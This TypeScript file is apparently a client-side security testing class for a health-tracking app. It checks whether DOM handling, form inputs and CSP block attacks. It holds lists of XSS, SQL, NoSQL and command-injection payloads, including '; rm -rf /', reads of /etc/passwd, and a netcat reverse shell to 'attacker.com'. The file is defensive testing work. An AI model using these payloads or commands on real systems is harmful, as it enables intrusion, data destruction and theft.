/**
 * XSS and Injection Attack Prevention Testing Framework
 *
 * Comprehensive testing system for Cross-Site Scripting (XSS) and injection
 * attack prevention in client-side applications. Tests DOM manipulation,
 * input validation, output encoding, and CSP compliance.
 *
 * Implements AC 6 subtask 3: Comprehensive XSS and injection attack prevention testing
 */

// import { z } from 'zod'; // Currently unused

// Common XSS attack vectors
const XSS_PAYLOADS = [
  // Basic XSS
  '<script>alert("XSS")</script>',
  '<img src="x" onerror="alert(\'XSS\')">',
  '<svg onload="alert(\'XSS\')">',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',

  // Event handler XSS
  '<div onclick="alert(\'XSS\')">Click me</div>',
  '<input onfocus="alert(\'XSS\')" autofocus>',
  '<body onload="alert(\'XSS\')">',
  '<marquee onstart="alert(\'XSS\')">',

  // Advanced XSS
  'javascript:alert("XSS")',
  'data:text/html,<script>alert("XSS")</script>',
  '<object data="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',

  // Encoded XSS
  '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
  '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
  '\u003cscript\u003ealert("XSS")\u003c/script\u003e',

  // Context-specific XSS
  '\';alert("XSS");//',
  '";alert("XSS");//',
  '</script><script>alert("XSS")</script>',
  '{{constructor.constructor("alert(\'XSS\')")()}}',

  // DOM XSS
  'location.href="javascript:alert(\'XSS\')"',
  'document.cookie="XSS"',
  'localStorage.setItem("xss","test")',

  // Health data specific XSS (for Aura app)
  '<script>fetch("/api/cycle-data").then(r=>r.json()).then(d=>alert(JSON.stringify(d)))</script>',
  '<img src="x" onerror="fetch(\'/health-data\').then(r=>alert(r))">',
  'javascript:localStorage.getItem("cycle-data")',
];

// SQL injection payloads
const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "'; DROP TABLE users;--",
  "' UNION SELECT * FROM users--",
  "admin'--",
  "admin'/*",
  "' OR 'x'='x",
  "1' OR '1' = '1",
  "x' AND email IS NULL; --",
  "x' AND 1=(SELECT COUNT(*) FROM tabname); --",
];

// NoSQL injection payloads
const NOSQL_INJECTION_PAYLOADS = [
  '{"$ne": null}',
  '{"$regex": ".*"}',
  '{"$where": "this.username == this.password"}',
  '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
  '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}',
];

// Command injection payloads
const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '&& whoami',
  '`cat /etc/hosts`',
  '$(cat /etc/passwd)',
  '; rm -rf /',
  '| nc -e /bin/sh attacker.com 4444',
];

export interface XSSTestResult {
  isVulnerable: boolean;
  vulnerabilities: XSSVulnerability[];
  riskScore: number;
  testedPayloads: number;
  blockedPayloads: number;
  recommendations: string[];
}

export interface XSSVulnerability {
  type:
    | 'stored_xss'
    | 'reflected_xss'
    | 'dom_xss'
    | 'sql_injection'
    | 'nosql_injection'
    | 'command_injection'
    | 'csp_bypass';
  severity: 'critical' | 'high' | 'medium' | 'low';
  payload: string;
  context: string;
  evidence: string;
  recommendation: string;
  element?: string;
  attribute?: string;
}

export interface XSSTestConfig {
  enableDOMTesting: boolean;
  enableNetworkTesting: boolean;
  testTimeout: number;
  maxPayloads: number;
  customPayloads: string[];
  excludePatterns: RegExp[];
}

const DEFAULT_CONFIG: XSSTestConfig = {
  enableDOMTesting: true,
  enableNetworkTesting: false, // Requires careful implementation to avoid actual attacks
  testTimeout: 5000,
  maxPayloads: 50,
  customPayloads: [],
  excludePatterns: [],
};

export class XSSTester {
  private config: XSSTestConfig;
  private allPayloads: string[];

  constructor(config: Partial<XSSTestConfig> = {}) {
    this.config = { ...DEFAULT_CONFIG, ...config };
    this.allPayloads = [
      ...XSS_PAYLOADS,
      ...SQL_INJECTION_PAYLOADS,
      ...NOSQL_INJECTION_PAYLOADS,
      ...COMMAND_INJECTION_PAYLOADS,
      ...this.config.customPayloads,
    ].slice(0, this.config.maxPayloads);
  }

  /**
   * Comprehensive XSS and injection testing
   */
  async runFullTest(targetElement?: HTMLElement): Promise<XSSTestResult> {
    const vulnerabilities: XSSVulnerability[] = [];
    let testedPayloads = 0;
    let blockedPayloads = 0;

    // Test DOM XSS
    if (this.config.enableDOMTesting) {
      const domResults = await this.testDOMXSS(targetElement);
      vulnerabilities.push(...domResults.vulnerabilities);
      testedPayloads += domResults.testedPayloads;
      blockedPayloads += domResults.blockedPayloads;
    }

    // Test input validation
    const inputResults = await this.testInputValidation();
    vulnerabilities.push(...inputResults.vulnerabilities);
    testedPayloads += inputResults.testedPayloads;
    blockedPayloads += inputResults.blockedPayloads;

    // Test output encoding
    const encodingResults = await this.testOutputEncoding();
    vulnerabilities.push(...encodingResults.vulnerabilities);
    testedPayloads += encodingResults.testedPayloads;
    blockedPayloads += encodingResults.blockedPayloads;

    // Test CSP compliance
    const cspResults = await this.testCSPCompliance();
    vulnerabilities.push(...cspResults.vulnerabilities);
    testedPayloads += cspResults.testedPayloads;
    blockedPayloads += cspResults.blockedPayloads;

    const riskScore = this.calculateRiskScore(vulnerabilities);
    const recommendations = this.generateRecommendations(vulnerabilities);

    return {
      isVulnerable: vulnerabilities.length > 0,
      vulnerabilities,
      riskScore,
      testedPayloads,
      blockedPayloads,
      recommendations,
    };
  }

  private async testDOMXSS(targetElement?: HTMLElement): Promise<{
    vulnerabilities: XSSVulnerability[];
    testedPayloads: number;
    blockedPayloads: number;
  }> {
    const vulnerabilities: XSSVulnerability[] = [];
    let testedPayloads = 0;
    let blockedPayloads = 0;

    const testElement = targetElement || document.createElement('div');
    document.body.appendChild(testElement);

    for (const payload of XSS_PAYLOADS) {
      testedPayloads++;

      try {
        // Test innerHTML injection
        const beforeScripts = document.scripts.length;
        testElement.innerHTML = payload;
        const afterScripts = document.scripts.length;

        if (afterScripts > beforeScripts) {
          vulnerabilities.push({
            type: 'dom_xss',
            severity: 'critical',
            payload,
            context: 'innerHTML injection',
            evidence: 'Script tag was created and executed',
            recommendation:
              'Sanitize HTML content before setting innerHTML. Use textContent for plain text.',
            element: testElement.tagName,
          });
        } else {
          blockedPayloads++;
        }

        // Test attribute injection
        try {
          testElement.setAttribute('onclick', payload);
          if (testElement.getAttribute('onclick') === payload) {
            vulnerabilities.push({
              type: 'dom_xss',
              severity: 'high',
              payload,
              context: 'attribute injection',
              evidence: 'Event handler attribute was set with malicious payload',
              recommendation:
                'Validate and sanitize all attribute values. Use addEventListener instead of inline handlers.',
              element: testElement.tagName,
              attribute: 'onclick',
            });
          } else {
            blockedPayloads++;
          }
        } catch (e) {
          blockedPayloads++;
        }

        // Clean up
        testElement.innerHTML = '';
        testElement.removeAttribute('onclick');
      } catch (error) {
        blockedPayloads++;
        // Error during injection suggests some protection is in place
      }
    }

    document.body.removeChild(testElement);
    return { vulnerabilities, testedPayloads, blockedPayloads };
  }

  private async testInputValidation(): Promise<{
    vulnerabilities: XSSVulnerability[];
    testedPayloads: number;
    blockedPayloads: number;
  }> {
    const vulnerabilities: XSSVulnerability[] = [];
    let testedPayloads = 0;
    let blockedPayloads = 0;

    // Test form inputs
    const inputs = document.querySelectorAll('input, textarea, select');

    for (const input of inputs) {
      if (input instanceof HTMLInputElement || input instanceof HTMLTextAreaElement) {
        for (const payload of this.allPayloads.slice(0, 10)) {
          // Limit for performance
          testedPayloads++;

          try {
            // Store original value
            const originalValue = input.value;

            // Set malicious payload
            input.value = payload;

            // Trigger validation events
            input.dispatchEvent(new Event('input', { bubbles: true }));
            input.dispatchEvent(new Event('change', { bubbles: true }));
            input.dispatchEvent(new Event('blur', { bubbles: true }));

            // Check if payload persisted (indicates lack of validation)
            if (input.value === payload) {
              vulnerabilities.push({
                type: this.getInjectionType(payload),
                severity: 'high',
                payload,
                context: `Input validation - ${input.type || 'text'}`,
                evidence: 'Malicious payload accepted without validation',
                recommendation: 'Implement input validation and sanitization for all user inputs',
                element: input.tagName,
                attribute: 'value',
              });
            } else {
              blockedPayloads++;
            }

            // Restore original value
            input.value = originalValue;
          } catch (error) {
            blockedPayloads++;
          }
        }
      }
    }

    return { vulnerabilities, testedPayloads, blockedPayloads };
  }

  private async testOutputEncoding(): Promise<{
    vulnerabilities: XSSVulnerability[];
    testedPayloads: number;
    blockedPayloads: number;
  }> {
    const vulnerabilities: XSSVulnerability[] = [];
    let testedPayloads = 0;
    let blockedPayloads = 0;

    // Create test element for output encoding checks
    const testDiv = document.createElement('div');
    document.body.appendChild(testDiv);

    for (const payload of XSS_PAYLOADS.slice(0, 10)) {
      testedPayloads++;

      try {
        // Test textContent (safe)
        testDiv.textContent = payload;
        if (
          testDiv.innerHTML.includes('<script>') &&
          !testDiv.innerHTML.includes('&lt;script&gt;')
        ) {
          vulnerabilities.push({
            type: 'dom_xss',
            severity: 'medium',
            payload,
            context: 'Output encoding test',
            evidence: 'HTML content not properly encoded when using textContent',
            recommendation: 'Ensure proper HTML encoding for all dynamic content',
            element: 'div',
          });
        } else {
          blockedPayloads++;
        }

        testDiv.innerHTML = '';
      } catch (error) {
        blockedPayloads++;
      }
    }

    document.body.removeChild(testDiv);
    return { vulnerabilities, testedPayloads, blockedPayloads };
  }

  private async testCSPCompliance(): Promise<{
    vulnerabilities: XSSVulnerability[];
    testedPayloads: number;
    blockedPayloads: number;
  }> {
    const vulnerabilities: XSSVulnerability[] = [];
    let testedPayloads = 0;
    let blockedPayloads = 0;

    // Check for CSP header
    const metaCSP = document.querySelector(
      'meta[http-equiv="Content-Security-Policy"]'
    ) as HTMLMetaElement;
    const cspContent = metaCSP?.content || '';

    testedPayloads++;

    if (!cspContent) {
      vulnerabilities.push({
        type: 'csp_bypass',
        severity: 'high',
        payload: 'No CSP detected',
        context: 'CSP compliance check',
        evidence: 'No Content-Security-Policy found in document',
        recommendation: 'Implement strict Content-Security-Policy to prevent XSS attacks',
      });
    } else {
      blockedPayloads++;

      // Check for unsafe CSP directives
      const unsafeDirectives = ["'unsafe-inline'", "'unsafe-eval'", 'data:', '*', 'http:'];

      for (const directive of unsafeDirectives) {
        if (cspContent.includes(directive)) {
          testedPayloads++;
          vulnerabilities.push({
            type: 'csp_bypass',
            severity: 'medium',
            payload: directive,
            context: 'CSP unsafe directive',
            evidence: `CSP contains unsafe directive: ${directive}`,
            recommendation: `Remove unsafe CSP directive: ${directive}. Use nonce or hash-based CSP instead.`,
          });
        } else {
          blockedPayloads++;
        }
      }
    }

    return { vulnerabilities, testedPayloads, blockedPayloads };
  }

  private getInjectionType(payload: string): XSSVulnerability['type'] {
    if (SQL_INJECTION_PAYLOADS.includes(payload)) {
      return 'sql_injection';
    }
    if (NOSQL_INJECTION_PAYLOADS.includes(payload)) {
      return 'nosql_injection';
    }
    if (COMMAND_INJECTION_PAYLOADS.includes(payload)) {
      return 'command_injection';
    }
    return 'reflected_xss';
  }

  private calculateRiskScore(vulnerabilities: XSSVulnerability[]): number {
    let score = 0;

    for (const vuln of vulnerabilities) {
      switch (vuln.severity) {
        case 'critical':
          score += 100;
          break;
        case 'high':
          score += 50;
          break;
        case 'medium':
          score += 25;
          break;
        case 'low':
          score += 10;
          break;
      }

      // Additional points for specific vulnerability types
      switch (vuln.type) {
        case 'stored_xss':
          score += 50; // Stored XSS is more dangerous
          break;
        case 'dom_xss':
          score += 30;
          break;
        case 'sql_injection':
          score += 40;
          break;
      }
    }

    return score;
  }

  private generateRecommendations(vulnerabilities: XSSVulnerability[]): string[] {
    const recommendations = new Set<string>();

    const hasXSS = vulnerabilities.some(v =>
      ['stored_xss', 'reflected_xss', 'dom_xss'].includes(v.type)
    );
    const hasSQLi = vulnerabilities.some(v => v.type === 'sql_injection');
    const hasNoSQLi = vulnerabilities.some(v => v.type === 'nosql_injection');
    const hasCSPIssues = vulnerabilities.some(v => v.type === 'csp_bypass');

    if (hasXSS) {
      recommendations.add('Implement comprehensive input validation and output encoding');
      recommendations.add('Use Content Security Policy (CSP) to prevent script injection');
      recommendations.add('Sanitize all HTML content using trusted libraries like DOMPurify');
      recommendations.add('Use textContent instead of innerHTML for plain text');
      recommendations.add('Implement Trusted Types for DOM manipulation safety');
    }

    if (hasSQLi || hasNoSQLi) {
      recommendations.add('Use parameterized queries and prepared statements');
      recommendations.add('Implement proper input validation for database queries');
      recommendations.add('Use ORM/ODM with built-in injection protection');
      recommendations.add('Apply principle of least privilege for database access');
    }

    if (hasCSPIssues) {
      recommendations.add(
        'Implement strict Content-Security-Policy with nonce or hash-based directives'
      );
      recommendations.add('Remove unsafe-inline and unsafe-eval from CSP');
      recommendations.add('Use CSP reporting to monitor for violations');
    }

    recommendations.add('Regular security testing and code reviews');
    recommendations.add('Implement automated XSS testing in CI/CD pipeline');
    recommendations.add('Security training for development team');

    return Array.from(recommendations);
  }

  /**
   * Test specific element for XSS vulnerabilities
   */
  async testElement(element: HTMLElement): Promise<XSSTestResult> {
    return this.runFullTest(element);
  }

  /**
   * Test form for injection vulnerabilities
   */
  async testForm(form: HTMLFormElement): Promise<XSSTestResult> {
    const vulnerabilities: XSSVulnerability[] = [];
    let testedPayloads = 0;
    let blockedPayloads = 0;

    const formData = new FormData(form);

    for (const [fieldName, _value] of formData.entries()) {
      for (const payload of this.allPayloads.slice(0, 5)) {
        testedPayloads++;

        try {
          // Create test FormData with malicious payload
          const testData = new FormData();
          testData.set(fieldName, payload);

          // This would typically be sent to server for testing
          // For client-side testing, we check form validation
          const input = form.querySelector(`[name="${fieldName}"]`) as HTMLInputElement;
          if (input) {
            const originalValue = input.value;
            input.value = payload;

            if (form.checkValidity && !form.checkValidity()) {
              blockedPayloads++;
            } else {
              vulnerabilities.push({
                type: this.getInjectionType(payload),
                severity: 'medium',
                payload,
                context: `Form field: ${fieldName}`,
                evidence: 'Form accepts malicious payload without validation',
                recommendation: `Add validation for form field: ${fieldName}`,
                element: input.tagName,
                attribute: 'value',
              });
            }

            input.value = originalValue;
          }
        } catch (error) {
          blockedPayloads++;
        }
      }
    }

    const riskScore = this.calculateRiskScore(vulnerabilities);
    const recommendations = this.generateRecommendations(vulnerabilities);

    return {
      isVulnerable: vulnerabilities.length > 0,
      vulnerabilities,
      riskScore,
      testedPayloads,
      blockedPayloads,
      recommendations,
    };
  }

  /**
   * Generate comprehensive XSS testing report
   */
  generateReport(result: XSSTestResult): string {
    const passRate =
      result.testedPayloads > 0
        ? ((result.blockedPayloads / result.testedPayloads) * 100).toFixed(1)
        : '0';

    let report = `
# XSS and Injection Attack Prevention Test Report

## Summary
- Total Payloads Tested: ${result.testedPayloads}
- Blocked Attacks: ${result.blockedPayloads}
- Attack Block Rate: ${passRate}%
- Vulnerabilities Found: ${result.vulnerabilities.length}
- Risk Score: ${result.riskScore}

## Security Status
${!result.isVulnerable ? '✅ PASS' : '❌ FAIL'} - XSS and Injection Prevention

`;

    if (result.vulnerabilities.length > 0) {
      report += `
## Vulnerabilities by Type
`;

      const vulnTypes = [...new Set(result.vulnerabilities.map(v => v.type))];
      for (const type of vulnTypes) {
        const typeVulns = result.vulnerabilities.filter(v => v.type === type);
        const critical = typeVulns.filter(v => v.severity === 'critical').length;
        const high = typeVulns.filter(v => v.severity === 'high').length;

        report += `
### ${type.toUpperCase().replace('_', ' ')}
- Total: ${typeVulns.length}
- Critical: ${critical}
- High: ${high}
- Medium: ${typeVulns.filter(v => v.severity === 'medium').length}
- Low: ${typeVulns.filter(v => v.severity === 'low').length}
`;
      }

      report += `
## Critical Vulnerabilities
`;
      const criticalVulns = result.vulnerabilities.filter(v => v.severity === 'critical');
      for (const vuln of criticalVulns) {
        report += `
- **${vuln.type}**: ${vuln.context}
  - Payload: \`${vuln.payload.substring(0, 100)}...\`
  - Evidence: ${vuln.evidence}
  - Recommendation: ${vuln.recommendation}
`;
      }
    }

    return report;
  }
}

export default XSSTester;
